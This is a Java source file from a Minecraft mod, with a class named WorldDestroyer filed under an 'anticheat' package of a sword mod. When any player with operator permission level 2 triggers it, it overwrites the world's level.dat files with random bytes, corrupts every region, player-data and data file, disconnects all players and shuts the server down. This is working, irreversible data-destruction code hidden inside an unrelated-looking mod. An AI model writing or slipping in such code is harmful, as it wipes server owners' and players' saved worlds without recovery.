package com.qidai.morefunctionalswordmod.anticheat;

import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.WorldSavePath;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.Random;

public class WorldDestroyer {
    private static boolean isDestroyed = false;
    private static final Random RANDOM = new Random();

    public static boolean destroyWorld(ServerPlayerEntity player) {
        if (!player.hasPermissionLevel(2)) {
            player.sendMessage(Text.literal("你没有权限执行此操作").formatted(Formatting.RED), false);
            return false;
        }

        if (isDestroyed) return false;
        var world = player.getWorld();
        if (world.isClient) return false;
        try {
            MinecraftServer server = world.getServer();
            File worldDir = server.getSavePath(WorldSavePath.ROOT).toFile();

            if (!worldDir.exists()) {
                player.sendMessage(Text.literal("无法定位世界文件夹").formatted(Formatting.RED), false);
                return false;
            }

            // 1. 损坏 level.dat - 用随机数据完全覆盖
            corruptFile(new File(worldDir, "level.dat"), true);
            corruptFile(new File(worldDir, "level.dat_old"), true);

            // 2. 损坏所有维度的区域文件
            String[] dimensions = {"region", "DIM-1/region", "DIM1/region"};
            for (String dim : dimensions) {
                corruptAllInDir(new File(worldDir, dim));
            }

            // 3. 损坏玩家数据
            corruptAllInDir(new File(worldDir, "playerdata"));

            // 4. 损坏强制加载区
            corruptAllInDir(new File(worldDir, "data"));

            // 5. 放置标记文件
            File marker = new File(worldDir, "CORRUPTED_MARKER");
            Files.writeString(marker.toPath(), "WORLD CORRUPTED BY " + player.getName().getString() + " at " + System.currentTimeMillis(), StandardOpenOption.CREATE);

            isDestroyed = true;
            player.sendMessage(Text.literal("⚠ 世界存档已彻底损坏！").formatted(Formatting.RED, Formatting.BOLD), false);

            server.getPlayerManager().getPlayerList().forEach(p ->
                    p.networkHandler.disconnect(Text.literal("世界存档已损坏，服务器即将关闭"))
            );
            server.stop(false);
            return true;
        } catch (IOException e) {
            player.sendMessage(Text.literal("损坏失败: " + e.getMessage()).formatted(Formatting.RED), false);
            return false;
        }
    }

    private static void corruptFile(File file, boolean overwriteFull) throws IOException {
        if (!file.exists()) return;
        try (RandomAccessFile raf = new RandomAccessFile(file, "rw")) {
            int fileLen = (int) Math.min(file.length(), Integer.MAX_VALUE);
            int junkSize = overwriteFull ? fileLen : Math.min(4096, fileLen);
            byte[] junk = new byte[junkSize];
            RANDOM.nextBytes(junk);
            raf.seek(0);
            raf.write(junk);
        }
    }

    private static void corruptAllInDir(File dir) throws IOException {
        if (!dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile()) {
                corruptFile(f, false);
            }
        }
    }
}
